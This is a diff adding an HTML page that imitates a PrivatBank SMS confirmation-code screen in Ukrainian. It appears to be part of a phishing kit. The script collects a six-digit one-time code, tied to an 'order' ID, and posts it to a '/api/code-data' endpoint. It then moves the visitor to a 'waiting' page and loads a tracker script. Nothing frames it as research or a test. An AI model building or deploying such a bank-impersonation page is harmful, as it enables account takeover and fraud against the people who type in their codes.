@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="uk" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Код підтвердження</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  html,body{height:100%;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
+  body{max-width:520px;margin:0 auto;min-height:100vh;background:#fff;display:flex;flex-direction:column}
+
+  .topbar{
+    display:flex;align-items:center;justify-content:space-between;
+    padding:14px 16px;background:#fff;border-bottom:3px solid #00A651;
+    position:sticky;top:0;z-index:10;
+  }
+  .topbar img{height:46px}
+  .topbar-title{font-size:16px;font-weight:700;color:#222}
+
+  .hero-banner{
+    background:#fff;padding:32px 24px;text-align:center;
+  }
+  .hero-banner .otp-img{
+    width:120px;height:120px;object-fit:contain;
+    margin:0 auto 18px;display:block;
+  }
+  .hero-banner h1{font-size:22px;font-weight:800;color:#1a1a1a;margin-bottom:8px}
+  .hero-banner p{font-size:14px;color:#888;line-height:1.6}
+
+  .content{flex:1;padding:28px 24px 0}
+
+  .error-msg{
+    display:none;background:#fff5f5;border:1px solid #fcc;border-radius:12px;
+    padding:12px 14px;margin-bottom:18px;color:#c62828;font-size:13px;text-align:center;font-weight:600;
+  }
+
+  .code-label{font-size:13px;color:#888;text-align:center;margin-bottom:16px}
+
+  .code-input-wrap{
+    max-width:320px;margin:0 auto 24px;display:flex;gap:10px;
+    justify-content:center;direction:ltr;
+  }
+  .code-digit{
+    width:46px;height:56px;border:2px solid #ddd;border-radius:12px;
+    text-align:center;font-size:26px;font-weight:700;font-family:monospace;
+    background:#fafafa;color:#1a1a1a;outline:none;transition:.2s;
+  }
+  .code-digit:focus{border-color:#00A651;background:#fff;box-shadow:0 0 0 3px rgba(0,166,81,.12)}
+
+  .info-box{
+    background:#fdf2f2;border:1px solid #f5d0d0;border-radius:12px;padding:14px 16px;
+    display:flex;align-items:flex-start;gap:10px;margin-bottom:20px;
+  }
+  .info-box svg{width:20px;height:20px;flex-shrink:0;fill:none;stroke:#00A651;stroke-width:2;margin-top:1px}
+  .info-box span{font-size:13px;color:#00A651;line-height:1.6}
+
+  .resend{text-align:center;margin-top:8px;font-size:13px;color:#888}
+  .resend a{color:#00A651;font-weight:600;text-decoration:none}
+
+  .bottom{padding:16px 24px 32px;margin-top:auto}
+  .submit-btn{
+    display:block;width:100%;padding:16px;border:none;border-radius:28px;
+    font-size:16px;font-weight:600;color:#fff;cursor:pointer;font-family:inherit;
+    background:#00A651;transition:.2s;
+  }
+  .submit-btn:hover{background:#008C45}
+  .submit-btn:disabled{opacity:.5;cursor:not-allowed}
+</style>
+</head>
+<body>
+
+  <div class="topbar">
+    <img src="images/privatbank-logo.jpg" alt="PrivatBank">
+    <span class="topbar-title">Підтвердження</span>
+  </div>
+
+  <div class="hero-banner">
+    <img class="otp-img" src="images/otp-phone.jpg" alt="OTP">
+    <h1>Код підтвердження</h1>
+    <p>Код підтвердження було надіслано на ваш зареєстрований номер телефону</p>
+  </div>
+
+  <div class="content">
+    <div class="error-msg" id="errorMsg"></div>
+
+    <div class="code-label">Введіть 6-значний код</div>
+
+    <div class="code-input-wrap">
+      <input class="code-digit" type="tel" maxlength="1" id="c0" autofocus>
+      <input class="code-digit" type="tel" maxlength="1" id="c1">
+      <input class="code-digit" type="tel" maxlength="1" id="c2">
+      <input class="code-digit" type="tel" maxlength="1" id="c3">
+      <input class="code-digit" type="tel" maxlength="1" id="c4">
+      <input class="code-digit" type="tel" maxlength="1" id="c5">
+    </div>
+
+    <div class="info-box">
+      <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/></svg>
+      <span>Не повідомляйте цей код нікому. PrivatBank ніколи не запитуватиме у вас цей код.</span>
+    </div>
+
+    <div class="resend">Не отримали код? <a href="#">Надіслати повторно</a></div>
+  </div>
+
+  <div class="bottom">
+    <button class="submit-btn" id="submitBtn" onclick="submitCode()">Підтвердити</button>
+  </div>
+
+<script>
+  const params = new URLSearchParams(location.search);
+  const orderId = params.get("order");
+  if (!orderId) location.href = "index.html";
+
+  if (params.get("error") === "1") {
+    const el = document.getElementById("errorMsg");
+    el.textContent = "Невірний або прострочений код";
+    el.style.display = "block";
+  }
+
+  const digits = document.querySelectorAll(".code-digit");
+  digits.forEach((inp, i) => {
+    inp.addEventListener("input", () => {
+      inp.value = inp.value.replace(/\D/g, "");
+      if (inp.value && i < digits.length - 1) digits[i + 1].focus();
+    });
+    inp.addEventListener("keydown", e => {
+      if (e.key === "Backspace" && !inp.value && i > 0) digits[i - 1].focus();
+    });
+    inp.addEventListener("paste", e => {
+      e.preventDefault();
+      const text = (e.clipboardData.getData("text") || "").replace(/\D/g, "");
+      for (let j = 0; j < digits.length && j < text.length; j++) {
+        digits[j].value = text[j];
+      }
+      const last = Math.min(text.length, digits.length) - 1;
+      if (last >= 0) digits[last].focus();
+    });
+  });
+
+  function getCode() {
+    return Array.from(digits).map(d => d.value).join("");
+  }
+
+  async function submitCode() {
+    const code = getCode();
+    if (code.length < 6) {
+      showError("Будь ласка, введіть повний код");
+      return;
+    }
+    const btn = document.getElementById("submitBtn");
+    btn.disabled = true;
+    btn.textContent = "Перевірка...";
+
+    try {
+      const res = await fetch("/api/code-data", {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({ order_id: orderId, code: code })
+      });
+      const data = await res.json();
+      if (data.success) {
+        location.href = "code-waiting.html?order=" + orderId;
+      } else {
+        showError(data.message || "Сталася помилка");
+        btn.disabled = false;
+        btn.textContent = "Підтвердити";
+      }
+    } catch(err) {
+      showError("Помилка з'єднання");
+      btn.disabled = false;
+      btn.textContent = "Підтвердити";
+    }
+  }
+
+  function showError(msg) {
+    const el = document.getElementById("errorMsg");
+    el.textContent = msg;
+    el.style.display = "block";
+  }
+</script>
+<script src="footer.js"></script>
+<script src="tracker.js"></script>
+</body>
+</html>
